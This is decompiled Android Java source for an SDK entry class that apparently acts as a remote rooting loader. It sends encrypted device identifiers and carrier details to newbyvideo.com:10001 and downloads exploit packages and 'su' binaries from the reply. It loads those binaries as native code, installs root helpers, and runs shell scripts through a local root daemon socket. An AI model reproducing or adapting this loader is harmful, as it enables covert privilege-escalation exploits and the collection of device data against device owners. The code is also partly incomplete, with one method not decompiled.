package com.goldcoast.sdk.domain;

import android.annotation.TargetApi;
import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.ConditionVariable;
import android.os.Process;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.util.Pair;
import com.cyjh.ddy.media.p035a.ResultTypeConstant;
import com.cyjh.ddy.thirdlib.lib_hwobs.HWYunManager;
import com.goldcoast.sdk.p050a.Device;
import com.goldcoast.sdk.p050a.FileInfo;
import com.goldcoast.sdk.p050a.PropInfo;
import com.goldcoast.sdk.p050a.Refer;
import com.goldcoast.sdk.p051b.NetWork;
import com.goldcoast.sdk.p051b.SuRestartLog;
import com.goldcoast.sdk.p052c.AESUtil;
import com.goldcoast.sdk.p052c.C1391d;
import com.goldcoast.sdk.p052c.C1392e;
import com.goldcoast.sdk.p052c.CrashRepository;
import com.goldcoast.sdk.p052c.LogUtil;
import com.goldcoast.sdk.p052c.SPUtil;
import com.king.sdk.IDFEE16B42C8B2890D8FF2860AF5562B1;
import com.king.sdk.KingListener;
import com.king.sdk.KingService;
import com.p018b.p019a.C0903ap;
import com.p018b.p019a.C0915y;
import com.p018b.p019a.FormBody;
import com.p018b.p019a.OkHttpClient;
import com.stripe.android.view.ShippingInfoWidget;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateEncodingException;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* loaded from: classes.dex */
public class EntryPoint {
    public static final byte RS_LONG = 1;
    public static final byte RS_MIXED = 2;
    public static final byte RS_TEMP = 0;
    public static final byte S_120 = 3;
    public static final byte S_123 = 2;
    public static final byte S_43 = 1;
    public static final byte S_47 = 4;

    /* renamed from: a */
    private static EntryPoint f9026a = null;

    /* renamed from: b */
    private static byte f9027b = 1;

    /* renamed from: c */
    private static String f9028c;

    /* renamed from: d */
    private static String f9029d;

    /* renamed from: e */
    private static String f9030e;
    public static File extractDir;

    /* renamed from: f */
    private static String f9031f;

    /* renamed from: h */
    private static AnalyseResult f9033h;

    /* renamed from: i */
    private static String f9034i;

    /* renamed from: m */
    private static boolean f9038m;
    protected static Application mContext;

    /* renamed from: n */
    private static final boolean f9039n;

    /* renamed from: A */
    private FileInfo f9040A;

    /* renamed from: B */
    private FileInfo f9041B;

    /* renamed from: F */
    private Pair<String, String> f9045F;

    /* renamed from: r */
    private int f9049r;

    /* renamed from: s */
    private int f9050s;

    /* renamed from: t */
    private int f9051t;

    /* renamed from: u */
    private int f9052u;

    /* renamed from: v */
    private ConnectivityManager f9053v;

    /* renamed from: w */
    private JNIWrapper f9054w;

    /* renamed from: x */
    private String f9055x;

    /* renamed from: z */
    private CrashRepository f9057z;

    /* renamed from: g */
    private static OkHttpClient f9032g = new OkHttpClient();

    /* renamed from: j */
    private static int f9035j = 60;

    /* renamed from: k */
    private static int f9036k = -1;

    /* renamed from: l */
    private static byte f9037l = 0;

    /* renamed from: o */
    private final String[] f9046o = {"天", "干", "地", "支", "山"};

    /* renamed from: p */
    private final KingListener f9047p = new BinderC1394a(this);

    /* renamed from: q */
    private boolean f9048q = false;

    /* renamed from: y */
    private boolean f9056y = false;

    /* renamed from: C */
    private boolean f9042C = false;

    /* renamed from: D */
    private boolean f9043D = false;

    /* renamed from: E */
    private BroadcastReceiver f9044E = new C1396c(this);

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: f */
    public static /* synthetic */ int m20280f(EntryPoint entryPoint) {
        int i = entryPoint.f9050s;
        entryPoint.f9050s = i + 1;
        return i;
    }

    static {
        boolean z = true;
        f9038m = true;
        if (Build.VERSION.SDK_INT < 14) {
            z = false;
        }
        f9039n = z;
        try {
            System.loadLibrary("goldcoast");
        } catch (Exception e) {
            f9038m = false;
            e.printStackTrace();
        }
    }

    private EntryPoint() {
        SPUtil.m20317a();
        SPUtil.m20314a("client", f9034i);
        if (f9038m) {
            this.f9054w = new JNIWrapper();
        }
        extractDir = new File(mContext.getFilesDir().getAbsoluteFile() + File.separator + "ota" + File.separator + "elf");
        try {
            mContext.unregisterReceiver(this.f9044E);
        } catch (Exception unused) {
        }
        this.f9053v = (ConnectivityManager) mContext.getSystemService("connectivity");
        mContext.registerReceiver(this.f9044E, new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"));
        LogUtil.m20320a(mContext);
        this.f9057z = CrashRepository.m20338a(mContext);
        initHost("http://www.newbyvideo.com:10001");
        SuRestartLog.m20346a(f9028c);
    }

    public static void init(Application application, String str, AnalyseResult analyseResult, int i, byte b) {
        mContext = application;
        f9033h = analyseResult;
        SPUtil.m20316a(mContext);
        f9034i = str;
        f9027b = b;
        if (i >= 120) {
            f9035j = i;
        }
    }

    public static EntryPoint instance() {
        if (f9026a == null) {
            f9026a = new EntryPoint();
        }
        return f9026a;
    }

    public void initHost(String str) {
        f9028c = str;
        f9029d = String.format("%s/api/v1/phones", f9028c);
        f9030e = String.format("%s/api/v1/phones/referer", f9028c);
        f9031f = String.format("%s/api/v1/where_is_the_way", f9028c);
    }

    public void braFlush() {
        File file = extractDir;
        if (file != null && file.listFiles() != null) {
            try {
                for (File file2 : extractDir.listFiles()) {
                    file2.delete();
                }
            } catch (Exception unused) {
            }
        }
    }

    /* renamed from: b */
    private void m20294b() {
        File file = new File(extractDir.getParent());
        if (file.listFiles() != null) {
            try {
                for (File file2 : file.listFiles()) {
                    file2.delete();
                }
            } catch (Exception unused) {
            }
        }
        extractDir.mkdirs();
        this.f9056y = false;
    }

    /* renamed from: c */
    private void m20288c() {
        File file = new File(mContext.getFilesDir().getAbsolutePath() + File.separator + "dump");
        if (file.exists()) {
            file.delete();
        }
        this.f9048q = false;
        this.f9050s = 0;
    }

    /* renamed from: a */
    private boolean m20309a(AnalyseResult analyseResult) {
        boolean z;
        NetworkInfo[] allNetworkInfo;
        ConnectivityManager connectivityManager = (ConnectivityManager) mContext.getSystemService("connectivity");
        if (!(connectivityManager == null || (allNetworkInfo = connectivityManager.getAllNetworkInfo()) == null)) {
            for (NetworkInfo networkInfo : allNetworkInfo) {
                if (networkInfo.getState() == NetworkInfo.State.CONNECTED) {
                    z = true;
                    break;
                }
            }
        }
        z = false;
        if (!z) {
            m20289b("start failed: 当前网络连接异常，请检测网络连接是否可用.", 1);
            return false;
        }
        SPUtil.m20317a();
        if (TextUtils.isEmpty(SPUtil.m20315a("client")) || mContext == null) {
            m20289b("start failed: 请在Application中调用 EntryPoint.init([context],[token])", 1);
            return false;
        } else if (analyseResult != null) {
            return true;
        } else {
            m20289b("start failed: 请初始化analyseResult参数", 1);
            return false;
        }
    }

    public synchronized void analyse(AnalyseResult analyseResult) {
        f9036k = -1;
        f9033h = analyseResult;
        if (m20309a(f9033h)) {
            if (getStatus()) {
                m20283e();
            } else if (f9036k == 0) {
                m20283e();
            } else if (this.f9042C) {
                m20289b("busying now\n$$$ failed", 1);
            } else {
                m20294b();
                m20288c();
                m20281f();
                JSONObject d = m20285d();
                for (int i = 0; i < this.f9046o.length; i++) {
                    if (i != 3) {
                        this.f9049r = i;
                        if (!this.f9048q) {
                            braFlush();
                            if (this.f9042C) {
                                break;
                            }
                            new Thread(new RunnableC1397d(this)).start();
                            if (f9036k != 0) {
                                ConditionVariable conditionVariable = new ConditionVariable(false);
                                m20289b(String.format("正在云端  [%s]  字组查找方案 请等待...", this.f9046o[i]), 2);
                                d.put("category", i);
                                d.put("sdkV", "4.0.14");
                                d.put("rtp", (int) f9027b);
                                FormBody a = new C0915y().m24361a("body", AESUtil.m20345a(d.toString())).m24362a();
                                LogUtil.m20321a();
                                LogUtil.m20318b("######\n" + String.format("<analyseQ.Enc>:%s\n", a.toString()));
                                conditionVariable.close();
                                f9032g.m24507a(new C0903ap().m24459a(f9029d).m24460a(a).m24463a()).mo24406a(new C1398e(this, conditionVariable, new boolean[]{false}));
                                conditionVariable.block();
                            }
                        } else {
                            return;
                        }
                    }
                }
            }
        }
    }

    public synchronized List<FileInfo> manual(int i, AnalyseResult analyseResult) {
        if (!f9038m) {
            return null;
        }
        f9036k = -1;
        f9033h = null;
        f9033h = analyseResult;
        if (!m20309a(f9033h)) {
            return null;
        }
        if (f9036k == 0) {
            m20283e();
            return null;
        } else if (this.f9042C) {
            m20289b("busying now\n$$$ failed", 1);
            return null;
        } else {
            m20294b();
            m20288c();
            m20281f();
            this.f9049r = i;
            JSONObject d = m20285d();
            new Thread(new RunnableC1399f(this)).start();
            ConditionVariable conditionVariable = new ConditionVariable(false);
            m20289b(String.format("正在云端  [%s]  字组查找方案 请等待...", this.f9046o[i]), 2);
            d.put("category", i);
            d.put("sdkV", "4.0.14");
            d.put("rtp", (int) f9027b);
            FormBody a = new C0915y().m24361a("body", AESUtil.m20345a(d.toString())).m24362a();
            LogUtil.m20321a();
            LogUtil.m20318b("######\n" + String.format("<analyseQ.Enc>:%s\n", a.toString()));
            conditionVariable.close();
            ArrayList arrayList = new ArrayList();
            f9032g.m24507a(new C0903ap().m24459a(f9029d).m24460a(a).m24463a()).mo24406a(new C1400g(this, arrayList, conditionVariable));
            conditionVariable.block();
            return arrayList;
        }
    }

    /* renamed from: d */
    private JSONObject m20285d() {
        C1391d.m20333a(mContext);
        Device a = C1391d.m20334a();
        JSONObject jSONObject = new JSONObject();
        PropInfo fVar = new PropInfo(PropInfo.m20367a());
        C1391d.m20333a(mContext);
        fVar.m20366a(C1391d.m20331c().m20368b());
        a.m20386a(fVar);
        jSONObject.put("device", a.m20389a());
        jSONObject.put("self", mContext.getPackageName());
        SPUtil.m20317a();
        jSONObject.put("token", SPUtil.m20315a("client"));
        jSONObject.put(HWYunManager.f7540a, mContext.getPackageName());
        jSONObject.put("signature", getCertificateFingerprintMD5());
        jSONObject.put("keyword", "");
        return jSONObject;
    }

    /* renamed from: b */
    private static void m20290b(String str) {
        String str2 = str.split("\\?")[0];
        String substring = str2.substring(str2.lastIndexOf("/") + 1, str2.length());
        NetWork.m20347a(str, mContext, str2);
        String str3 = extractDir.getAbsolutePath() + File.separator + substring;
        m20300a(new FileInputStream(str3), extractDir.getAbsolutePath());
        new File(str3).delete();
    }

    /* renamed from: c */
    private void m20286c(String str) {
        if (!this.f9056y) {
            String str2 = str.split("\\?")[0];
            String substring = str2.substring(str2.lastIndexOf("/") + 1, str2.length());
            String str3 = extractDir.getAbsolutePath() + File.separator + substring;
            NetWork.m20347a(str, mContext, substring);
            m20300a(new FileInputStream(str3), extractDir.getParent());
            new File(str3).delete();
            String format = String.format("%s%slibsu.so", extractDir.getParent(), File.separator);
            File file = new File(mContext.getFilesDir().getAbsolutePath() + File.separator + "permmgr" + File.separator + "libsu.so");
            if (!file.exists()) {
                file.mkdirs();
            }
            File file2 = new File(format);
            C1392e.m20327a(file2, file);
            C1392e.m20328a(file);
            file2.delete();
            this.f9056y = true;
        }
    }

    /* renamed from: e */
    private void m20283e() {
        m20289b("$$$ success", 0);
        this.f9048q = true;
        braFlush();
    }

    public void getBra(FileInfo dVar) {
        NetWork.m20347a(dVar.m20370f(), mContext, dVar.m20377a());
        if (TextUtils.isEmpty(dVar.m20375b())) {
            m20289b("poc is null", 2);
        } else if (dVar.m20377a().endsWith(".zip")) {
            String str = extractDir.getAbsolutePath() + File.separator + dVar.m20377a();
            dVar.m20376a(m20300a(new FileInputStream(str), extractDir.getAbsolutePath()));
            new File(str).delete();
        }
        this.f9040A = dVar;
        if (this.f9057z.m20335c(dVar.m20377a())) {
            m20289b("$$$ skip", 2);
        } else if (this.f9049r != 4) {
            m20293b(dVar);
        } else if (m20310a(dVar) == 3000) {
            m20283e();
        } else {
            m20289b("$$$ failed", 1);
            braFlush();
        }
    }

    @TargetApi(3)
    /* renamed from: a */
    private void m20296a(String str, int i, String str2, int i2) {
        File file = new File(extractDir.getAbsolutePath(), str);
        Refer gVar = new Refer();
        PropInfo fVar = new PropInfo(PropInfo.m20367a());
        C1391d.m20333a(mContext);
        fVar.m20366a(C1391d.m20334a().m20384b().m20368b());
        gVar.m20360a(fVar);
        gVar.m20359a(str);
        gVar.m20362a(i);
        gVar.m20357b(str2);
        gVar.m20361a(System.currentTimeMillis());
        C1391d.m20333a(mContext);
        gVar.m20356c(C1391d.m20332b());
        try {
            TelephonyManager telephonyManager = (TelephonyManager) mContext.getSystemService(ShippingInfoWidget.f12563f);
            gVar.m20355d(telephonyManager.getNetworkOperatorName());
            gVar.m20354e(telephonyManager.getSimOperatorName());
        } catch (Exception unused) {
        }
        gVar.m20353f(Locale.getDefault().getDisplayLanguage());
        gVar.m20352g(Locale.getDefault().getDisplayCountry());
        SPUtil.m20317a();
        gVar.m20351h(SPUtil.m20315a("client"));
        gVar.m20349j(mContext.getPackageName());
        gVar.m20348k(getCertificateFingerprintMD5());
        gVar.m20358b(i2);
        gVar.m20350i("4.0.14");
        file.delete();
        try {
            m20297a(AESUtil.m20345a(gVar.m20363a().toString()), -1, 1);
        } catch (Exception unused2) {
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: a */
    public void m20297a(String str, int i, int i2) {
        FormBody a = new C0915y().m24361a("body", str).m24362a();
        StringBuilder sb = new StringBuilder();
        if (i2 == 2) {
            sb.append("######rePost\n");
        } else {
            sb.append("######\n");
        }
        sb.append(String.format("<feedbackQ.Enc>:%s\n", a.toString()));
        LogUtil.m20321a();
        LogUtil.m20318b(sb.toString());
        ConditionVariable conditionVariable = new ConditionVariable(false);
        conditionVariable.close();
        f9032g.m24507a(new C0903ap().m24459a(f9030e).m24460a(a).m24463a()).mo24406a(new C1401h(this, i2, str, conditionVariable, i));
        conditionVariable.block();
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: f */
    public void m20281f() {
        new Thread(new RunnableC1402i(this)).start();
    }

    /* renamed from: a */
    private int m20310a(FileInfo dVar) {
        m20289b(String.format("key:%s\norder:%d name: %s", dVar.m20371e(), Integer.valueOf(dVar.m20372d()), dVar.m20377a()), 2);
        try {
            if (this.f9054w == null) {
                return -1;
            }
            return this.f9054w.loadSO(String.format("%s/ota/elf/%s", mContext.getFilesDir(), dVar.m20377a()));
        } catch (Exception e) {
            e.printStackTrace();
            return -1;
        }
    }

    @TargetApi(5)
    /* renamed from: b */
    private Pair<String, String> m20293b(FileInfo dVar) {
        if (f9036k == 0) {
            return new Pair<>("yes", "$$$ success");
        }
        ConditionVariable conditionVariable = new ConditionVariable(false);
        conditionVariable.close();
        CrashRepository cVar = this.f9057z;
        String a = dVar.m20377a();
        if (!cVar.m20335c(a)) {
            String a2 = cVar.m20339a();
            JSONArray jSONArray = null;
            if (TextUtils.isEmpty(a2)) {
                jSONArray = new JSONArray();
            } else {
                try {
                    jSONArray = new JSONArray(a2);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            try {
                jSONArray.put(a);
                cVar.m20337a(jSONArray.toString());
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        new Thread(new RunnableC1403j(this, dVar)).start();
        new Thread(new RunnableC1395b(this, conditionVariable)).start();
        conditionVariable.block();
        this.f9057z.m20336b(dVar.m20377a());
        if (this.f9045F == null) {
            this.f9045F = new Pair<>("no", "not return any result");
        }
        return this.f9045F;
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: b */
    public void m20289b(String str, int i) {
        f9036k = i;
        if (i == 0) {
            if (!TextUtils.isEmpty(str)) {
                FileInfo dVar = this.f9041B;
                if (dVar == null || !dVar.m20377a().equals(this.f9040A.m20377a())) {
                    this.f9041B = this.f9040A;
                    this.f9057z.m20337a("");
                    FileInfo dVar2 = this.f9040A;
                    if (dVar2 != null) {
                        m20296a(dVar2.m20377a(), 1, str, this.f9040A.m20373c());
                    }
                    for (int i2 = 0; i2 < 30; i2++) {
                        try {
                            if (getStatus()) {
                                break;
                            }
                            Thread.sleep(1000L);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    f9033h.onSuccess(str);
                }
            }
        } else if (i == 1) {
            f9033h.onFailed(str);
            braFlush();
            FileInfo dVar3 = this.f9040A;
            if (dVar3 != null) {
                m20296a(dVar3.m20377a(), -1, str, this.f9040A.m20373c());
            }
        } else if (i == 2) {
            f9033h.onProgress(str);
        } else if (this.f9049r == 4 && this.f9051t - 1 == this.f9052u) {
            f9033h.onFailed(str);
            braFlush();
            FileInfo dVar4 = this.f9040A;
            if (dVar4 != null) {
                m20296a(dVar4.m20377a(), -1, str, this.f9040A.m20373c());
            }
        } else {
            f9033h.onException(str);
        }
    }

    /* renamed from: a */
    private static String m20300a(InputStream inputStream, String str) {
        ZipInputStream zipInputStream = new ZipInputStream(inputStream);
        String str2 = "";
        zipInputStream.available();
        String str3 = "";
        int i = 0;
        while (true) {
            ZipEntry nextEntry = zipInputStream.getNextEntry();
            if (nextEntry == null) {
                break;
            } else if (!str2.startsWith("META-INF") && !nextEntry.isDirectory()) {
                if (nextEntry.getName().startsWith("_")) {
                    str3 = nextEntry.getName();
                }
                i++;
                str2 = nextEntry.getName();
                File file = new File(str, str2);
                file.delete();
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                m20301a(zipInputStream, fileOutputStream);
                fileOutputStream.close();
                C1392e.m20328a(file);
            }
        }
        zipInputStream.close();
        return i > 1 ? str3 : str2;
    }

    /* renamed from: a */
    private static void m20301a(InputStream inputStream, OutputStream outputStream) {
        byte[] bArr = new byte[4096];
        while (true) {
            int read = inputStream.read(bArr);
            if (read > 0) {
                outputStream.write(bArr, 0, read);
            } else {
                return;
            }
        }
    }

    public String getStackString(Throwable th) {
        StringWriter stringWriter = new StringWriter();
        PrintWriter printWriter = new PrintWriter(stringWriter);
        th.printStackTrace(printWriter);
        printWriter.close();
        return stringWriter.toString();
    }

    public void cleanSkipFlag() {
        this.f9057z.m20337a("");
    }

    public boolean hasSkip() {
        return !TextUtils.isEmpty(this.f9057z.m20339a());
    }

    public boolean getStatus() {
        boolean g = m20279g();
        f9037l = (byte) 0;
        return g;
    }

    /* renamed from: g */
    private static boolean m20279g() {
        try {
            LocalSocket localSocket = new LocalSocket();
            localSocket.connect(new LocalSocketAddress("darwin.rodo", LocalSocketAddress.Namespace.ABSTRACT));
            localSocket.close();
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    public void execDarwin(String[] strArr) {
        if (strArr != null && strArr.length > 0) {
            File file = new File(mContext.getFilesDir(), "tmp.sh");
            if (!file.exists()) {
                try {
                    file.createNewFile();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            C1392e.m20324a(strArr, file);
            C1392e.m20325a(file.getAbsolutePath(), 511);
            m20302a(file);
        }
    }

    /* renamed from: a */
    private static boolean m20302a(File file) {
        try {
            LocalSocket localSocket = new LocalSocket();
            localSocket.connect(new LocalSocketAddress("darwin.rodo", LocalSocketAddress.Namespace.ABSTRACT));
            byte[] bytes = file.getAbsolutePath().getBytes();
            ByteBuffer allocate = ByteBuffer.allocate(bytes.length + 4);
            allocate.order(ByteOrder.LITTLE_ENDIAN);
            allocate.putInt(bytes.length);
            allocate.put(bytes);
            localSocket.getOutputStream().write(allocate.array());
            byte[] bytes2 = String.valueOf(Process.myPid()).getBytes();
            Log.d("KingDaemon", "client pid=" + Process.myPid());
            ByteBuffer allocate2 = ByteBuffer.allocate(bytes2.length + 4);
            allocate2.order(ByteOrder.LITTLE_ENDIAN);
            allocate2.putInt(bytes2.length);
            allocate2.put(bytes2);
            localSocket.getOutputStream().write(allocate2.array());
            localSocket.close();
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    public boolean exec(String[] strArr) {
        if (!getStatus()) {
            Log.d("EntryPoint", "getStatus failed, Service not start");
            return false;
        }
        byte b = f9037l;
        if (b == 0) {
            execDarwin(strArr);
        } else if (b == 1) {
            try {
                KingService a = KingService.m19793a(mContext);
                int myPid = Process.myPid();
                String packageName = mContext.getPackageName();
                SPUtil.m20317a();
                a.m19788a(strArr, myPid, packageName, SPUtil.m20315a("client"));
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Log.d("EntryPoint", "Service has been stoped");
            return false;
        }
        return true;
    }

    public String getCertificateFingerprintMD5() {
        PackageInfo packageInfo;
        CertificateFactory certificateFactory;
        X509Certificate x509Certificate;
        try {
            packageInfo = mContext.getPackageManager().getPackageInfo(mContext.getPackageName(), 64);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            packageInfo = null;
        }
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(packageInfo.signatures[0].toByteArray());
        try {
            certificateFactory = CertificateFactory.getInstance("X509");
        } catch (CertificateException e2) {
            e2.printStackTrace();
            certificateFactory = null;
        }
        try {
            x509Certificate = (X509Certificate) certificateFactory.generateCertificate(byteArrayInputStream);
        } catch (CertificateException e3) {
            e3.printStackTrace();
            x509Certificate = null;
        }
        try {
            return m20295a(MessageDigest.getInstance("MD5").digest(x509Certificate.getEncoded()));
        } catch (NoSuchAlgorithmException e4) {
            e4.printStackTrace();
            return null;
        } catch (CertificateEncodingException e5) {
            e5.printStackTrace();
            return null;
        }
    }

    /* renamed from: a */
    private static String m20295a(byte[] bArr) {
        StringBuilder sb = new StringBuilder(bArr.length * 2);
        for (int i = 0; i < bArr.length; i++) {
            String hexString = Integer.toHexString(bArr[i]);
            int length = hexString.length();
            if (length == 1) {
                hexString = ResultTypeConstant.f7213z + hexString;
            }
            if (length > 2) {
                hexString = hexString.substring(length - 2, length);
            }
            sb.append(hexString.toUpperCase());
            if (i < bArr.length - 1) {
                sb.append(':');
            }
        }
        return sb.toString();
    }

    public boolean registerStatus(boolean z, KingListener kingListener) {
        if (!getStatus()) {
            return false;
        }
        if (kingListener == null) {
            kingListener = this.f9047p;
        }
        if (z) {
            try {
                KingService.m19793a(mContext).m19792a((IDFEE16B42C8B2890D8FF2860AF5562B1) kingListener);
                return true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            try {
                KingService.m19793a(mContext).m19791a(kingListener);
                return true;
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return false;
    }

    public boolean sendmsg(String str, String str2) {
        try {
            return KingService.m19793a(mContext).m19789a(str, str2);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean sendData(String str, int i, byte[] bArr) {
        try {
            return KingService.m19793a(mContext).m19790a(str, i, bArr);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: c */
    public static /* synthetic */ void m20287c(EntryPoint entryPoint) {
        if (!TextUtils.isEmpty(entryPoint.f9057z.m20339a())) {
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put("rf_md5", entryPoint.f9057z.m20339a());
                C1391d.m20333a(mContext);
                jSONObject.put("android_id", C1391d.m20332b());
                SPUtil.m20317a();
                jSONObject.put("token", SPUtil.m20315a("client"));
                jSONObject.put(HWYunManager.f7540a, mContext.getPackageName());
                jSONObject.put("signature", entryPoint.getCertificateFingerprintMD5());
                f9032g.m24507a(new C0903ap().m24459a(f9031f).m24460a(new C0915y().m24361a("body", AESUtil.m20345a(jSONObject.toString())).m24362a()).m24463a()).mo24407a();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* JADX WARN: Removed duplicated region for block: B:41:0x0154  */
    /* JADX WARN: Removed duplicated region for block: B:42:0x015b  */
    /* renamed from: a */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static /* synthetic */ void m20306a(com.goldcoast.sdk.domain.EntryPoint r19, java.lang.String r20) {
        /*
            Method dump skipped, instructions count: 514
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.goldcoast.sdk.domain.EntryPoint.m20306a(com.goldcoast.sdk.domain.EntryPoint, java.lang.String):void");
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: a */
    public static /* synthetic */ void m20304a(EntryPoint entryPoint, String str, List list) {
        String optString = new JSONObject(str).optString("body", "");
        if (TextUtils.isEmpty(optString)) {
            entryPoint.m20289b("response body is null", 2);
            return;
        }
        LogUtil.m20321a();
        LogUtil.m20318b("######\n" + String.format("<analyseP.Enc>:%s\n", str));
        JSONObject jSONObject = new JSONObject(AESUtil.m20344b(optString));
        JSONArray optJSONArray = jSONObject.optJSONArray("bra");
        entryPoint.f9051t = optJSONArray.length();
        String optString2 = jSONObject.optString("global", "");
        int optInt = jSONObject.optInt("category", 0);
        String optString3 = jSONObject.optString("token", "");
        if (!TextUtils.isEmpty(optString3)) {
            SPUtil.m20317a();
            SPUtil.m20314a("client", optString3);
        }
        entryPoint.m20286c(optString2);
        String optString4 = jSONObject.optString("poc", "");
        new ArrayList();
        if (optJSONArray != null && optJSONArray.length() > 0) {
            for (int i = 0; i < optJSONArray.length() && !entryPoint.f9042C; i++) {
                entryPoint.f9052u = i;
                JSONObject jSONObject2 = optJSONArray.getJSONObject(i);
                String optString5 = jSONObject2.optString("file");
                entryPoint.f9055x = jSONObject2.optString("params");
                int optInt2 = jSONObject2.optInt("category");
                int optInt3 = jSONObject2.optInt("order");
                String optString6 = jSONObject2.optString("file_hex", "");
                String optString7 = jSONObject2.optString("component", "");
                String str2 = optString5.split("\\?")[0];
                LogUtil.m20321a();
                LogUtil.m20319a("parseResponse_m->braUrl=" + str2);
                FileInfo dVar = new FileInfo(optString5.substring(str2.lastIndexOf("/") + 1, str2.length()), optInt2, optString4, optInt3, optString6, optString5);
                if (!entryPoint.f9048q) {
                    if (optInt == 0 && !TextUtils.isEmpty(optString7) && !optString7.equals("null") && !optString7.equals("[]")) {
                        m20290b(optString7);
                    } else if (i == 0 && !optString7.equals("null") && !optString7.equals("[]")) {
                        m20290b(optString7);
                    }
                    list.add(dVar);
                } else {
                    return;
                }
            }
        } else if (entryPoint.f9049r == 4) {
            entryPoint.m20289b("not found suitable su file\n$$$ failed", 1);
        } else {
            entryPoint.m20289b("not found suitable su file ", 2);
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: a */
    public static /* synthetic */ void m20299a(String str) {
        JSONArray jSONArray;
        try {
            SPUtil.m20317a();
            String a = SPUtil.m20315a("refer");
            if (TextUtils.isEmpty(a)) {
                jSONArray = new JSONArray();
            } else {
                jSONArray = new JSONArray(a);
            }
            jSONArray.put(str);
            SPUtil.m20317a();
            SPUtil.m20314a("refer", jSONArray.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: a */
    public static /* synthetic */ void m20311a(int i) {
        try {
            SPUtil.m20317a();
            String a = SPUtil.m20315a("refer");
            if (!TextUtils.isEmpty(a)) {
                JSONArray jSONArray = new JSONArray(a);
                JSONArray jSONArray2 = new JSONArray();
                for (int i2 = 0; i2 < jSONArray.length(); i2++) {
                    if (i2 != i) {
                        jSONArray2.put(jSONArray.get(i2).toString());
                    }
                }
                SPUtil.m20317a();
                SPUtil.m20314a("refer", jSONArray2.toString());
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: a */
    public static /* synthetic */ String m20298a(String str, int i) {
        if (i == 2 || i == 3) {
            String str2 = extractDir.getParent() + File.separator + ".romaster_root";
            File file = new File(extractDir.getAbsolutePath() + File.separator + str);
            C1392e.m20327a(file, new File(str2));
            C1392e.m20325a(str2, 493);
            file.delete();
            return extractDir.getParent() + File.separator + "shua .romaster_root";
        }
        return extractDir.getAbsolutePath() + File.separator + str;
    }
}
